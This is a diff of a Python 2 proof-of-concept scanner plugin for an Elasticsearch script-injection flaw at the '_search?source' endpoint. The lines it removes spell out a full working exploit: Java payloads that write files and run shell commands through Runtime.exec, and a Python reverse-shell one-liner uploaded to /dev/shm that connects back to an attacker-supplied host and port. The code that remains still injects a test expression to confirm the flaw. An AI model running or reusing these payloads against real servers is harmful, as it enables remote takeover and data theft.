@@ -47,12 +47,6 @@ class MyPoc(BaseFrame):
         },
     }
 
-    def _init_user_parser(self):
-        self.user_parser.add_option('-H', '--rhost',
-                                    dest='rhost', help='remote host')
-        self.user_parser.add_option('-P', '--rport',
-                                    dest='rport', help='remote port')
-
     @classmethod
     def _emit(cls, args, exp):
         data = {
@@ -76,56 +70,21 @@ class MyPoc(BaseFrame):
         headers['Accept'] = 'ext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
         url = args['options']['target'] + '/_search?source'
         req = urllib2.Request(url, data=payload, headers=headers)
-        try:
-            resp = urllib2.urlopen(req)
-        except urllib2.URLError as ex:
-            if args['options']['verbose']:
-                print '[!] {}'.format(ex)
-            return None
-        except urllib2.HTTPError as ex:
-            if args['options']['verbose']:
-                print '[!] {}'.format(ex)
-            return None
-
+        resp = urllib2.urlopen(req)
         if resp.getcode() != 200 or \
            'application/json' not in resp.headers.get('content-type'):
             return None
         else:
             ret = json.loads(resp.read())
-            ret = ret.get('hits')
-            if ret is None:
-                return None
-            ret = ret.get('hits', [])
-            if len(ret) < 1:
-                return None
-            ret = ret[0].get('fields')
-            if ret is None:
-                return None
-            ret = ret.get('task', [])
-            if len(ret) < 1:
-                return None
-            else:
-                return ret[0]
-
-    @classmethod
-    def _upload(cls, args, dest, content):
-        exp = 'import java.util.*;\nimport java.io.*;\nFile f = new File(\"' + dest + '\");if(f.exists()){\"exists\".toString();}BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f),\"UTF-8\"));bw.write(\"' + content + '\");bw.flush();bw.close();if(f.exists()){\"success\".toString();}'
-        return cls._emit(args, exp)
-
-    @classmethod
-    def _execute(cls, args, cmd):
-        exp = 'import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"'+cmd+'\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"#*!");}sb.toString();'
-        rs = cls._emit(args, exp)
-        if rs is None:
-            return None
-        else:
-            return rs.replace('#*!', '\n')
+            return ret['hits']['hits'][0]['fields']['task'][0]
 
     @classmethod
     def verify(cls, args):
         rs = cls._emit(args, 'Integer.toHexString(65535)')
         if rs == 'ffff':
+            url = args['options']['target'] + '/_search?source'
             args['success'] = True
+            args['poc_ret']['vul_url'] = url
             if args['options']['verbose']:
                 print '[*] {} is vulnerable'.format(args['options']['target'])
         else:
@@ -135,30 +94,11 @@ class MyPoc(BaseFrame):
 
         return args
 
-    @classmethod
-    def exploit(cls, args):
-        rhost = args['options']['rhost']
-        rport = args['options']['rport']
-        if args['options']['verbose']:
-            print '[*] Reverse shell connect to {}:{}'.format(rhost, rport)
-        shellcode = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"%s\\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/bash\\",\\"-i\\"]);' % (rhost, rport)
-        rs = cls._upload(args, '/dev/shm/es-vuls-demo.py', shellcode)
-        if rs is None:
-            if args['options']['verbose']:
-                print '[x] upload shellcode to {} failed'.format(args['options']['target'])
-            args['success'] = False
-            return args
-        rs = cls._execute(args, 'python /dev/shm/es-vuls-demo.py')
-        if rs is None:
-            if args['options']['verbose']:
-                print '[x] remote code execute failed'
-            args['success'] = False
-            return args
-        args['success'] = True
-        return args
+    exploit = verify
+
 
 if __name__ == '__main__':
     from pprint import pprint
 
     mp = MyPoc()
-    pprint(mp.run(debug=True))
+    pprint(mp.run())
